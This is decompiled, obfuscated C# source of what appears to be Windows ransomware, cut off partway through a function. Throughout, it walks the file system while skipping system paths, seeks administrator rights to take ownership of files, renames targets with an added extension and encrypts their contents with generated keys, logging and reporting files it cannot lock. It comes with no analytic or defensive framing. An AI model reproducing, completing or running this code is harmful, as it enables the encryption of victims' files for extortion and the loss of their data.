using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ADkkFdOHNYjDk;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

internal sealed class RQEwPOshulKqs
{
	public sealed class OYORDAJGVWu
	{
		private static StringCollection DlbScQpFAOAyLR;

		private static List<string> JjRWxjqHBlZtl;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107405508));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107405503)) && !text.ToLower().Contains(getString_0(107405514)) && !text.ToLower().Contains(getString_0(107391539)) && !text.ToLower().Contains(getString_0(107391526)) && !text.ToLower().Contains(getString_0(107405469)) && !text.ToLower().Contains(getString_0(107391378)) && !text.ToLower().Contains(getString_0(107390775)) && !text.ToLower().Contains(getString_0(107390790)) && !text.ToLower().Contains(getString_0(107390741)) && !text.ToLower().Contains(getString_0(107390724)) && !text.ToLower().Contains(getString_0(107390690)) && !text.ToLower().Contains(getString_0(107390705)) && !text.ToLower().Contains(getString_0(107390656)) && !text.ToLower().Contains(getString_0(107390675)) && !text.ToLower().Contains(getString_0(107390622)) && !text.ToLower().Contains(getString_0(107390641)) && !text.ToLower().Contains(getString_0(107390596)) && !text.ToLower().Contains(getString_0(107390611)) && !text.ToLower().Contains(getString_0(107391074)) && !text.Contains(JqDJfBiOyDaAy(getString_0(107391089))) && !text.Contains(getString_0(107391032)) && !text.Contains(getString_0(107391051)) && !text.EndsWith(getString_0(107394486)) && !text.EndsWith(getString_0(107395141)) && !text.EndsWith(getString_0(107391002)) && !text.EndsWith(getString_0(107395104)) && !text.EndsWith(getString_0(107390997)) && !text.ToLower().Contains(getString_0(107391024)) && !text.ToLower().Contains(pcdcyuTjjngA))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(GZecQutuAYrd) * 1024.0 * 1024.0 && buxEOyFbGjfNzeAW == getString_0(107396812))
							{
								JjRWxjqHBlZtl.Add(text);
							}
							else if (File.Exists(text) && buxEOyFbGjfNzeAW == getString_0(107397069))
							{
								JjRWxjqHBlZtl.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return JjRWxjqHBlZtl;
		}

		static OYORDAJGVWu()
		{
			Strings.CreateGetStringDelegate(typeof(OYORDAJGVWu));
			DlbScQpFAOAyLR = new StringCollection();
			JjRWxjqHBlZtl = new List<string>();
		}
	}

	private sealed class SopQsPPkSScp
	{
		public string oFMarRepQsTvd;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == oFMarRepQsTvd;
		}
	}

	private sealed class dBfCHUgEGYG
	{
		public string cCKscmLjgqEgN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__18(int int_0)
		{
			Thread.Sleep(LoqeOEkLpePTMECv);
			FYgeyItMBgHKLJgZ.Add(getString_0(107390957) + cCKscmLjgqEgN + getString_0(107397185) + (char)int_0 + getString_0(107405487));
			try
			{
				if (DcTmJYuRqmJcpcY)
				{
					Console.WriteLine(getString_0(107390957) + cCKscmLjgqEgN + getString_0(107397185) + (char)int_0 + getString_0(107405487));
				}
			}
			catch
			{
			}
		}

		static dBfCHUgEGYG()
		{
			Strings.CreateGetStringDelegate(typeof(dBfCHUgEGYG));
		}
	}

	private sealed class ITCukbrtEbPW
	{
		private sealed class rtHaJlKJsmfG
		{
			public ITCukbrtEbPW SDPTJeBjOOW;

			public string siDSXstNNrM;

			public void _003CCrypt_003Eb__24()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					yiFezsWeGjitO(WindowsIdentity.GetCurrent().Name, siDSXstNNrM);
				}
			}

			public void _003CCrypt_003Eb__25()
			{
				cTSPHdoergifAD(siDSXstNNrM, SDPTJeBjOOW.sDVewQFEqEIbCRF, SDPTJeBjOOW.WOCeXDEuwOyQFVj, SDPTJeBjOOW.fkLrKwgxXLk, SDPTJeBjOOW.ZnHFVonNCbqP);
			}
		}

		public string[] sDVewQFEqEIbCRF;

		public string[] fkLrKwgxXLk;

		public string ZnHFVonNCbqP;

		public string WOCeXDEuwOyQFVj;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__23(string string_0)
		{
			rtHaJlKJsmfG CS_0024_003C_003E8__locals0 = new rtHaJlKJsmfG();
			CS_0024_003C_003E8__locals0.SDPTJeBjOOW = this;
			CS_0024_003C_003E8__locals0.siDSXstNNrM = string_0;
			if (luDuQnkIvNDbdd && !UkwNvBJJCwFjgR().Contains(getString_0(107388828)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						yiFezsWeGjitO(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.siDSXstNNrM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (RPyXoPlOJmdYqIY == getString_0(107396820))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					cTSPHdoergifAD(CS_0024_003C_003E8__locals0.siDSXstNNrM, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.sDVewQFEqEIbCRF, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.WOCeXDEuwOyQFVj, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.fkLrKwgxXLk, CS_0024_003C_003E8__locals0.SDPTJeBjOOW.ZnHFVonNCbqP);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				cTSPHdoergifAD(CS_0024_003C_003E8__locals0.siDSXstNNrM, sDVewQFEqEIbCRF, WOCeXDEuwOyQFVj, fkLrKwgxXLk, ZnHFVonNCbqP);
			}
		}

		static ITCukbrtEbPW()
		{
			Strings.CreateGetStringDelegate(typeof(ITCukbrtEbPW));
		}
	}

	private sealed class mnXXSXntfqSpCE
	{
		private sealed class ybRaFCfdAcS
		{
			public mnXXSXntfqSpCE tBUKpZGtZOxvzqk;

			public string SscAMTfCJZFIj;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in vAvIzfBtHKG)
				{
					if (SscAMTfCJZFIj.ToLower().EndsWith(item + tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == getString_0(107396831))
					{
						if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(SscAMTfCJZFIj).Length)
						{
							try
							{
								vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107392007), getString_0(107392002), getString_0(107391957), SscAMTfCJZFIj);
							}
							catch
							{
							}
						}
					}
					else if (SscAMTfCJZFIj.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107397088))
					{
						try
						{
							vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107392007), getString_0(107392002), getString_0(107391957), SscAMTfCJZFIj);
						}
						catch
						{
						}
					}
				}
			}

			static ybRaFCfdAcS()
			{
				Strings.CreateGetStringDelegate(typeof(ybRaFCfdAcS));
			}
		}

		private sealed class FYMTYsvedWj
		{
			public mnXXSXntfqSpCE tBUKpZGtZOxvzqk;

			public string mYcUYPSeirgm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in vAvIzfBtHKG)
				{
					if (mYcUYPSeirgm.ToLower().EndsWith(item + tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == getString_0(107396834))
					{
						if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(mYcUYPSeirgm).Length)
						{
							try
							{
								vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107392010), getString_0(107392005), getString_0(107391960), mYcUYPSeirgm);
							}
							catch
							{
							}
						}
					}
					else if (mYcUYPSeirgm.ToLower().EndsWith(item) && ilWxgAZLeD == getString_0(107397091))
					{
						try
						{
							vnvqegDZgMFTThUQ.EtLrisjAZLbg(getString_0(107392010), getString_0(107392005), getString_0(107391960), mYcUYPSeirgm);
						}
						catch
						{
						}
					}
				}
			}

			static FYMTYsvedWj()
			{
				Strings.CreateGetStringDelegate(typeof(FYMTYsvedWj));
			}
		}

		public List<string> EvgOSsAktNPa;

		public List<string> PAntdrlTZkgXTD;

		public string OnwOnmkBWIVal;

		public string[] MNbgFyZffSKl;

		public string DUKuBNRvAydYG;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			ybRaFCfdAcS CS_0024_003C_003E8__locals0;
			foreach (string item in PAntdrlTZkgXTD)
			{
				if (MNbgFyZffSKl.Length != 0)
				{
					string[] mNbgFyZffSKl = MNbgFyZffSKl;
					int num = 0;
					while (num < mNbgFyZffSKl.Length)
					{
						string value = mNbgFyZffSKl[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09a3;
					}
				}
				try
				{
					if (item.EndsWith(OnwOnmkBWIVal))
					{
						goto IL_09a3;
					}
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				if (!item.EndsWith(string_0) || oODUpNadLmFxS.Contains(item))
				{
					continue;
				}
				if (xziKmMkpqKW == getString_0(107396828))
				{
					try
					{
						if (OVAWlGSBxtgO.eWzXoGEEKK(item))
						{
							OVAWlGSBxtgO.lbpBdeyOdYV(item);
						}
					}
					catch
					{
					}
				}
				oODUpNadLmFxS.Add(item);
				if (!ytgqYFajIsYkRHo.Contains(Path.GetDirectoryName(item)))
				{
					ytgqYFajIsYkRHo.Add(Path.GetDirectoryName(item));
				}
				qVCNNzzGmwuooDZ(item);
				try
				{
					new GyjxqaSPQe().ZQZXBbcsBMnvz(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DcTmJYuRqmJcpcY)
							{
								Console.WriteLine(getString_0(107405495) + item + getString_0(107405930) + new FileInfo(item).Length + getString_0(107405941));
								Console.WriteLine(getString_0(107405900));
							}
						}
						catch
						{
						}
						xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107405827)), getString_0(107390924) + item + getString_0(107390924) + JqDJfBiOyDaAy(getString_0(107405770)) + getString_0(107390924) + Environment.UserName + getString_0(107390924) + JqDJfBiOyDaAy(getString_0(107405785)));
					}
				}
				catch (Exception ex2)
				{
					if (rcFXGcWApOJB)
					{
						try
						{
							File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + item + getString_0(107405760) + ex2.Message + getString_0(107396264));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (rcFXGcWApOJB)
						{
							try
							{
								File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + item + getString_0(107405135) + ex4.Message + getString_0(107396264));
							}
							catch (Exception)
							{
							}
						}
						CBbCjcYRLmYL++;
						goto end_IL_02cd;
					}
					if (CWgqQYxkECI == getString_0(107396828) && new FileInfo(item).Length > Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024 && !EvgOSsAktNPa.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ybRaFCfdAcS();
						CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk = this;
						try
						{
							if (OnwOnmkBWIVal != getString_0(107388174))
							{
								if (oVVBsGsoBvRKjE)
								{
									OnwOnmkBWIVal = nmBFzgaiOADgSVhq + OnwOnmkBWIVal;
								}
								File.Move(item, item + OnwOnmkBWIVal);
							}
						}
						catch (Exception ex6)
						{
							if (rcFXGcWApOJB)
							{
								try
								{
									File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + item + getString_0(107405074) + ex6.Message + getString_0(107396264));
								}
								catch (Exception)
								{
								}
							}
							CBbCjcYRLmYL++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = getString_0(107391891);
						if (OnwOnmkBWIVal != getString_0(107388174))
						{
							CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = item + OnwOnmkBWIVal;
						}
						else
						{
							CS_0024_003C_003E8__locals0.SscAMTfCJZFIj = item;
						}
						if (baVPzfInuLOtD == getString_0(107396828))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in vAvIzfBtHKG)
								{
									if (CS_0024_003C_003E8__locals0.SscAMTfCJZFIj.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == ybRaFCfdAcS.getString_0(107396831))
									{
										if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.SscAMTfCJZFIj).Length)
										{
											try
											{
												vnvqegDZgMFTThUQ.EtLrisjAZLbg(ybRaFCfdAcS.getString_0(107392007), ybRaFCfdAcS.getString_0(107392002), ybRaFCfdAcS.getString_0(107391957), CS_0024_003C_003E8__locals0.SscAMTfCJZFIj);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.SscAMTfCJZFIj.ToLower().EndsWith(item2) && ilWxgAZLeD == ybRaFCfdAcS.getString_0(107397088))
									{
										try
										{
											vnvqegDZgMFTThUQ.EtLrisjAZLbg(ybRaFCfdAcS.getString_0(107392007), ybRaFCfdAcS.getString_0(107392002), ybRaFCfdAcS.getString_0(107391957), CS_0024_003C_003E8__locals0.SscAMTfCJZFIj);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
						string text2 = getString_0(107391891);
						text2 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : getString_0(107391891));
						string s = pQtTIepfVunG.MmnVKLBAZcnOVX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = vbCIKVbhqx.BYkQAgVUBLyxo(CS_0024_003C_003E8__locals0.SscAMTfCJZFIj, Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024);
						if (!vbCIKVbhqx.IEfuzgSYhKmrIk(oNXixkHbkQIFSeb: (!BJyvjcvspWj) ? (JweQHtvwAVLtP ? vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(DUKuBNRvAydYG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JweQHtvwAVLtP ? MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(DUKuBNRvAydYG), Convert.FromBase64String(sCJKcfPXYjG))), GBvLgTwuHXdjy: CS_0024_003C_003E8__locals0.SscAMTfCJZFIj, oZzmHOGHcgTH: bytes))
						{
							try
							{
								File.Move(item + OnwOnmkBWIVal, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_09a3;
					}
					if (oVVBsGsoBvRKjE)
					{
						OnwOnmkBWIVal = nmBFzgaiOADgSVhq + OnwOnmkBWIVal;
					}
					string text3 = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
					string text4 = getString_0(107391891);
					text4 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : getString_0(107391891));
					string s2 = pQtTIepfVunG.MmnVKLBAZcnOVX(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (OnwOnmkBWIVal != getString_0(107388174))
					{
						if (!XTugcnpxmKWX)
						{
							if (!JweQHtvwAVLtP)
							{
								UgscNpyaZraAU(item, item + OnwOnmkBWIVal, jBAOFpxRKVADf);
							}
							else
							{
								UgscNpyaZraAU(item, item + OnwOnmkBWIVal, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!JweQHtvwAVLtP)
								{
									zGYgJOabDUZgZoa(item, item + OnwOnmkBWIVal, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
								}
								else
								{
									zGYgJOabDUZgZoa(item, item + OnwOnmkBWIVal, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex9)
							{
								if (rcFXGcWApOJB)
								{
									try
									{
										File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + item + getString_0(107388192) + ex9.Message + getString_0(107396264));
									}
									catch (Exception)
									{
									}
								}
								CBbCjcYRLmYL++;
								try
								{
									File.Move(item + OnwOnmkBWIVal, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!XTugcnpxmKWX)
					{
						if (!JweQHtvwAVLtP)
						{
							UgscNpyaZraAU(item, item + getString_0(107388169), jBAOFpxRKVADf);
						}
						else
						{
							UgscNpyaZraAU(item, item + getString_0(107388169), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!JweQHtvwAVLtP)
							{
								zGYgJOabDUZgZoa(item, item, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
							}
							else
							{
								zGYgJOabDUZgZoa(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex12)
						{
							if (rcFXGcWApOJB)
							{
								try
								{
									File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + item + getString_0(107388192) + ex12.Message + getString_0(107396264));
								}
								catch (Exception)
								{
								}
							}
							CBbCjcYRLmYL++;
							goto end_IL_02cd;
						}
					}
					if (JweQHtvwAVLtP)
					{
						if (OnwOnmkBWIVal != getString_0(107388174))
						{
							mHyPlqBfINJNrTmd(item + OnwOnmkBWIVal, bytes2);
						}
						else
						{
							mHyPlqBfINJNrTmd(item, bytes2);
						}
					}
					goto IL_09a3;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				continue;
				IL_09a3:
				PAntdrlTZkgXTD.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			FYMTYsvedWj CS_0024_003C_003E8__locals0 = new FYMTYsvedWj();
			CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk = this;
			CS_0024_003C_003E8__locals0.mYcUYPSeirgm = string_0;
			if (MNbgFyZffSKl.Length != 0)
			{
				string[] mNbgFyZffSKl = MNbgFyZffSKl;
				int num = 0;
				while (num < mNbgFyZffSKl.Length)
				{
					string value = mNbgFyZffSKl[num];
					if (!CS_0024_003C_003E8__locals0.mYcUYPSeirgm.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.EndsWith(OnwOnmkBWIVal))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!oODUpNadLmFxS.Contains(CS_0024_003C_003E8__locals0.mYcUYPSeirgm))
			{
				if (xziKmMkpqKW == getString_0(107396828))
				{
					try
					{
						if (OVAWlGSBxtgO.eWzXoGEEKK(CS_0024_003C_003E8__locals0.mYcUYPSeirgm))
						{
							OVAWlGSBxtgO.lbpBdeyOdYV(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
						}
					}
					catch
					{
					}
				}
				oODUpNadLmFxS.Add(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				if (!ytgqYFajIsYkRHo.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.mYcUYPSeirgm)))
				{
					ytgqYFajIsYkRHo.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.mYcUYPSeirgm));
				}
				qVCNNzzGmwuooDZ(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				try
				{
					new GyjxqaSPQe().ZQZXBbcsBMnvz(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DcTmJYuRqmJcpcY)
							{
								Console.WriteLine(getString_0(107405495) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107405930) + new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length + getString_0(107405941));
								Console.WriteLine(getString_0(107405900));
							}
						}
						catch
						{
						}
						xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107405827)), getString_0(107390924) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107390924) + JqDJfBiOyDaAy(getString_0(107405770)) + getString_0(107390924) + Environment.UserName + getString_0(107390924) + JqDJfBiOyDaAy(getString_0(107405785)));
					}
				}
				catch (Exception ex2)
				{
					if (rcFXGcWApOJB)
					{
						try
						{
							File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107405760) + ex2.Message + getString_0(107396264));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (rcFXGcWApOJB)
						{
							try
							{
								File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107405135) + ex4.Message + getString_0(107396264));
							}
							catch (Exception)
							{
							}
						}
						CBbCjcYRLmYL++;
						goto end_IL_031d_2;
					}
					if (CWgqQYxkECI == getString_0(107396828) && new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length > Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024)
					{
						try
						{
							if (OnwOnmkBWIVal != getString_0(107388174))
							{
								if (oVVBsGsoBvRKjE)
								{
									OnwOnmkBWIVal = nmBFzgaiOADgSVhq + OnwOnmkBWIVal;
								}
								File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal);
							}
						}
						catch (Exception ex6)
						{
							if (rcFXGcWApOJB)
							{
								try
								{
									File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107405074) + ex6.Message + getString_0(107396264));
								}
								catch (Exception)
								{
								}
							}
							CBbCjcYRLmYL++;
							return;
						}
						if (OnwOnmkBWIVal != getString_0(107388174))
						{
							CS_0024_003C_003E8__locals0.mYcUYPSeirgm += OnwOnmkBWIVal;
						}
						if (baVPzfInuLOtD == getString_0(107396828))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in vAvIzfBtHKG)
								{
									if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.tBUKpZGtZOxvzqk.OnwOnmkBWIVal) && ilWxgAZLeD == FYMTYsvedWj.getString_0(107396834))
									{
										if (Convert.ToInt32(ZCRgCrsIaCud) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm).Length)
										{
											try
											{
												vnvqegDZgMFTThUQ.EtLrisjAZLbg(FYMTYsvedWj.getString_0(107392010), FYMTYsvedWj.getString_0(107392005), FYMTYsvedWj.getString_0(107391960), CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.mYcUYPSeirgm.ToLower().EndsWith(item) && ilWxgAZLeD == FYMTYsvedWj.getString_0(107397091))
									{
										try
										{
											vnvqegDZgMFTThUQ.EtLrisjAZLbg(FYMTYsvedWj.getString_0(107392010), FYMTYsvedWj.getString_0(107392005), FYMTYsvedWj.getString_0(107391960), CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
						string text2 = getString_0(107391891);
						text2 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : getString_0(107391891));
						string s = pQtTIepfVunG.MmnVKLBAZcnOVX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = vbCIKVbhqx.BYkQAgVUBLyxo(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, Convert.ToInt32(NzKGGrtTBpkeMR) * 1024 * 1024);
						if (!vbCIKVbhqx.IEfuzgSYhKmrIk(oNXixkHbkQIFSeb: (!BJyvjcvspWj) ? (JweQHtvwAVLtP ? vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : vbCIKVbhqx.sSRSaFyGDhu(byte_, Convert.FromBase64String(DUKuBNRvAydYG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JweQHtvwAVLtP ? MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : MVtRUvNrdgwG.ELBkKiLWwNhvzh(byte_, Convert.FromBase64String(DUKuBNRvAydYG), Convert.FromBase64String(sCJKcfPXYjG))), GBvLgTwuHXdjy: CS_0024_003C_003E8__locals0.mYcUYPSeirgm, oZzmHOGHcgTH: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (oVVBsGsoBvRKjE)
						{
							OnwOnmkBWIVal = nmBFzgaiOADgSVhq + OnwOnmkBWIVal;
						}
						string text3 = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
						string text4 = getString_0(107391891);
						text4 = (JweQHtvwAVLtP ? EyxHIzBgCEnzgn.tpIepiJRhhm() : getString_0(107391891));
						string s2 = pQtTIepfVunG.MmnVKLBAZcnOVX(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (OnwOnmkBWIVal != getString_0(107388174))
						{
							if (!XTugcnpxmKWX)
							{
								if (!JweQHtvwAVLtP)
								{
									UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, jBAOFpxRKVADf);
								}
								else
								{
									UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!JweQHtvwAVLtP)
									{
										zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
									}
									else
									{
										zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (rcFXGcWApOJB)
									{
										try
										{
											File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107388192) + ex9.Message + getString_0(107396264));
										}
										catch (Exception)
										{
										}
									}
									CBbCjcYRLmYL++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!XTugcnpxmKWX)
						{
							if (!JweQHtvwAVLtP)
							{
								UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107388169), jBAOFpxRKVADf);
							}
							else
							{
